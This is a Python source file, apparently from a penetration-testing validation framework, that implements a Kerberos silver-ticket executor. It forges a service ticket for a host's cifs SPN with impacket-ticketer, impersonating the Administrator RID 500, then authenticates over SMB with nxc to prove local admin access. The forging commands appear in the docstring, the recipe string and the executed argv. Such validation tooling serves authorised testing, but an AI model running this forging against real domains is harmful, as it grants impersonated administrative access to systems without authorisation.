"""SILVER-TICKET validation executor -- T4 (Kerberos ticket forging).

Forge a SERVICE ticket (TGS) for a specific SPN with that service account's key,
granting access to that one service as any principal, then authenticate through it:

    impacket-ticketer -nthash/-aesKey <service_key> -domain-sid <SID> -domain <d>
                      -spn cifs/<host> -user-id 500 <user>            (forge)
    KRB5CCNAME=<ccache> nxc smb <host> --use-kcache --kdcHost <dc>    (= the terminal)

SERVICE-SCOPED, not domain persistence (review H8): the effect is admin access to
that host's SMB service (``local_admin_for(host)``), NOT ``S_PERSISTENCE``. The
service key is a SECRET (``cfg.forge_key`` standalone, or a threaded service
credential), presence-only. Non-mutating; no rollback. This tranche validates the
SMB-reachable ``cifs/<host>`` SPN only (the forged-ccache login predicate cannot
validate arbitrary SPNs). ``verified_recipe=True`` (lab-proven on GOAD 27NOV2026, scored *proved*, secret-clean).
"""
from __future__ import annotations

from pathlib import Path

from ..recommend import ParamSpec, values
from .. import proof, states
from .base import (ValidationExecutor, ExecutorContext, Capability, CAP_PRINCIPAL)
from .forge_common import (signing_key, key_flag, valid_key, resolve_domain_sid,
                           forge_and_reauth)


class SilverTicketExecutor(ValidationExecutor):
    technique = "SILVER-TICKET"
    technique_class = "kerberos_forge"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True         # lab-proven on GOAD 27NOV2026 (forge+reauth, scored proved, secret-clean)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_COMPUTER_CONTROL})
    recipe_ref = ("T4 SILVER = impacket-ticketer -nthash/-aesKey <service_key> -domain-sid <SID> "
                  "-domain <d> -spn cifs/<host> -user-id 500 <user> ; nxc --use-kcache reauth "
                  "(service-scoped; recipe pinned in-lab)")

    def param_specs(self, ctx, finding):
        e = finding.entity or {}
        host = e.get("service_host") or finding.host or ""
        return [
            ParamSpec(name="service_host", kind="target_host",
                      description="FQDN of the host whose cifs SPN is forged (and reauth target).",
                      recommended=host, rationale="The service the silver ticket targets.",
                      required=True),
            ParamSpec(name="forged_user", kind="free",
                      description="Principal the forged service ticket impersonates.",
                      recommended=e.get("forged_user") or "Administrator",
                      rationale="A silver ticket impersonates any principal to the service."),
            ParamSpec(name="user_id", kind="free",
                      description="RID of the forged user.",
                      recommended=e.get("user_id") or "500", rationale="500 = Administrator."),
            ParamSpec(name="domain_sid", kind="free",
                      description="Domain SID (auto-resolved via lookupsid if omitted).",
                      recommended=e.get("domain_sid") or "",
                      rationale="Resolved from the configured DC when not supplied.", required=False),
        ]

    def target_identity(self, ctx, finding, params):
        host = params["service_host"].value if "service_host" in params else ""
        forged = params["forged_user"].value if "forged_user" in params else "Administrator"
        return {"domain": ctx.config.domain, "principal": forged, "host": host}

    def steps_preview(self, ctx, finding, params):
        v = values(params)
        return [
            f"impacket-ticketer <key-flag> *** -domain-sid {v.get('domain_sid') or '<auto>'} "
            f"-domain {ctx.config.domain} -spn cifs/{v['service_host']} -user-id {v['user_id']} {v['forged_user']}",
            f"nxc smb {v['service_host']} --use-kcache --kdcHost {ctx.config.dc_ip}  (= the terminal proof)",
        ]

    def chain_eff(self, ctx, finding):
        host = self._params(ctx, finding)["service_host"].value
        return frozenset({states.local_admin_for(host)})

    def execute(self, ctx: ExecutorContext, finding, params) -> dict:
        cfg = ctx.config
        v = values(params)
        out_dir = Path(ctx.output_dir)
        steps: list = []
        errors: list = []
        gate = {"classifier": "not_required", "op": None}

        sid = resolve_domain_sid(ctx, v.get("domain_sid") or None)
        if not sid:
            errors.append("domain_sid_unresolved")
            return self._artifact(steps, gate, None, False, errors)
        key, kind = signing_key(ctx)
        if not valid_key(key, kind):
            errors.append("no_service_key")
            return self._artifact(steps, gate, None, False, errors)

        host = v["service_host"]
        forged = v["forged_user"]
        forge_argv = ["impacket-ticketer", key_flag(kind), key, "-domain-sid", sid,
                      "-domain", cfg.domain, "-spn", f"cifs/{host}",
                      "-user-id", v["user_id"], forged]
        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, host, out_dir,
                                               expect_principal=forged)
        steps += fsteps
        errors += ferrors

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok, impersonated=forged,
            predicate=(f"forged a silver TGS for cifs/{host} impersonating {forged} and "
                       "authenticated through the forged ccache"),
            proof_token=proof.proof_token("SILVER-TICKET", cfg.domain, host, forged,
                                          "authn_success" if ok else "authn_failed"),
            extra={"forged_user": forged, "service_host": host},
        )
        return self._artifact(steps, gate, terminal_fact, ok, errors)

    def produced(self, ctx, finding, params, artifact):
        if not artifact.get("complete"):
            return []
        host = params["service_host"].value
        return [Capability(state=states.local_admin_for(host), channel=CAP_PRINCIPAL,
                           value=host, principal=host)]

    @staticmethod
    def _artifact(steps, gate, terminal_fact, complete, errors):
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": {"applied": False,
                             "rollback": {"performed": False, "verified": True, "method": None}},
                "terminal_fact": terminal_fact, "complete": complete, "errors": errors}
